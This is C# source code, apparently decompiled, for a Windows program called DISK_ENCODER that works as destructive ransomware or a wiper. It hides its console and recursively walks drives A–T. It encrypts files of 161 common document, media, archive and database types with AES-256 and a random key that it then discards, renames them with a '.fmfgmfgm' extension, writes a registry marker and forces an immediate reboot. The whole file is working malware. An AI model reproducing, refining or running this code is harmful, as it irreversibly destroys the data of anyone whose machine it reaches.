using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace DISK_ENCODER;

internal class DISK_ENCODER
{
	private static string asdasd = Environment.UserName;

	private static string ffdffd = Environment.MachineName.ToString();

	private static RegistryKey GET_REGKEY = null;

	private static FileInfo GET_FILE_INFO = null;

	private static byte[] __CIPHER(byte[] INPUT_HANDLER, byte[] GET_ttytty)
	{
		byte[] array = null;
		byte[] salt = new byte[65]
		{
			137, 200, 250, 142, 208, 142, 192, 142, 216, 251,
			184, 3, 0, 205, 16, 180, 19, 48, 192, 187,
			15, 0, 49, 210, 185, 30, 0, 232, 30, 0,
			91, 69, 82, 82, 79, 82, 93, 32, 77, 66,
			82, 32, 112, 97, 116, 99, 104, 101, 100, 32,
			98, 121, 32, 98, 111, 111, 116, 107, 105, 116,
			93, 205, 16, 235, 254
		};
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(GET_ttytty, salt, 4096);
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(INPUT_HANDLER, 0, INPUT_HANDLER.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private static string __KEYGEN(int GET_KEY_SIZE)
	{
		int num = 0;
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (num < GET_KEY_SIZE--)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgğüçşöhijklmnopqrstuvwxyz0123456789!*@$+/)%(&?-="[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgğüçşöhijklmnopqrstuvwxyz0123456789!*@$+/)%(&?-=".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void __ENCRYPTION(string GET_INPUT_FILE, string GET_ttytty)
	{
		try
		{
			GET_FILE_INFO = new FileInfo(GET_INPUT_FILE);
			byte[] array = null;
			byte[] iNPUT_HANDLER = File.ReadAllBytes(GET_INPUT_FILE);
			byte[] bytes = Encoding.UTF8.GetBytes(GET_ttytty);
			bytes = SHA256.Create().ComputeHash(bytes);
			if (GET_FILE_INFO.Length <= 10485760L)
			{
				array = __CIPHER(iNPUT_HANDLER, bytes);
				File.WriteAllBytes(GET_INPUT_FILE, array);
				File.Move(GET_INPUT_FILE, GET_INPUT_FILE + ".fmfgmfgm");
			}
		}
		catch
		{
			Thread.Sleep(100);
		}
	}

	private static void __INIT(string GET_DIRECTORY, string GET_ttytty)
	{
		try
		{
			GC.Collect();
			string[] files = Directory.GetFiles(GET_DIRECTORY);
			foreach (string text in files)
			{
				string[] source = new string[161]
				{
					".ads", ".jpg", ".png", ".gif", ".psd", ".tga", ".bmp", ".ico", ".jpeg", ".svg",
					".tiff", ".tif", ".jpe", ".jfif", ".raw", ".ai", ".rle", ".mp4", ".avi", ".mpeg",
					".mpg", ".vcd", ".vid", ".vob", ".swf", ".webm", ".vob", ".wm", ".wmv", ".yuv",
					".dat", ".f4v", ".asx", ".3g2", ".3gp", ".asf", ".mkv", ".rm", ".aif", ".amr",
					".aob", ".asf", ".aud", ".flac", ".iff", ".m3u", ".m3u8", ".m4a", ".m4b", ".mid",
					".midi", ".mod", ".mp3", ".mpa", ".ogg", ".wav", ".wave", ".ra", ".wma", ".asp",
					".aspx", ".doc", ".docx", ".docm", ".dot", ".dotm", ".dotx", ".epub", ".gpx", ".key",
					".mobi", ".djv", ".djvu", ".pages", ".pdf", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
					".pptx", ".rtf", ".xls", ".xml", ".xlsm", ".xlsb", ".xlsx", ".xlt", ".xltm", ".xltx",
					".xps", ".odt", ".indd", ".pif", ".rar", ".zip", ".7z", ".cab", ".cbr", ".gz",
					".jar", ".gzip", ".arj", ".pkg", ".pak", ".tar", ".tar-gz", ".tgz", ".xar", ".zipx",
					".spl", ".ace", ".tmp", ".shs", ".xps", ".cf", ".log", ".txt", ".dt", ".cfu",
					".mxl", ".1cd", ".efd", ".mft", ".pff", ".st", ".grs", ".erf", ".epf", ".elf",
					".lgf", ".cdn", ".ps", ".bat", ".cmd", ".yaml", ".lock", ".json", ".cfg", ".vbs",
					".db", ".data", ".ini", ".sig", ".ftl", ".sqlite", ".msg", ".scr", ".theme", ".html",
					".htm", ".hta", ".pub", ".vss", ".bak", ".url", ".cdw", ".dwg", ".dxf", ".jgs",
					".sat"
				};
				GET_FILE_INFO = new FileInfo(text);
				try
				{
					if (source.Contains(GET_FILE_INFO.Extension.ToString()))
					{
						__ENCRYPTION(text, GET_ttytty);
					}
				}
				catch
				{
					Thread.Sleep(100);
				}
			}
			string[] directories = Directory.GetDirectories(GET_DIRECTORY);
			foreach (string gET_DIRECTORY in directories)
			{
				try
				{
					__INIT(gET_DIRECTORY, GET_ttytty);
				}
				catch
				{
					Thread.Sleep(100);
				}
			}
		}
		catch
		{
			Thread.Sleep(100);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		int num = 0;
		string gET_ttytty = __KEYGEN(2048);
		string[] array = new string[10] { "C:\\", "D:\\", "E:\\", "I:\\", "G:\\", "H:\\", "F:\\", "B:\\", "A:\\", "T:\\" };
		GET_REGKEY = Registry.CurrentUser.CreateSubKey("Software\\Wow6432Node\\Microsoft\\Active Setup\\0STATUS");
		try
		{
			IntPtr consoleWindow = GetConsoleWindow();
			ShowWindow(consoleWindow, 0);
			for (num = 0; num < 10; num++)
			{
				__INIT(array[num], gET_ttytty);
			}
			try
			{
				gET_ttytty = null;
				GET_REGKEY.SetValue("PC", ffdffd);
				GET_REGKEY.SetValue("USER", asdasd);
				GET_REGKEY.SetValue("STATUS", "| ENCRYPTEDD |");
				GET_REGKEY.Close();
				Process.Start("shutdown", "/r /t 0");
				Environment.Exit(0);
			}
			catch
			{
				gET_ttytty = null;
				Process.GetCurrentProcess().Kill();
			}
		}
		catch
		{
			gET_ttytty = null;
			Process.GetCurrentProcess().Kill();
		}
	}
}
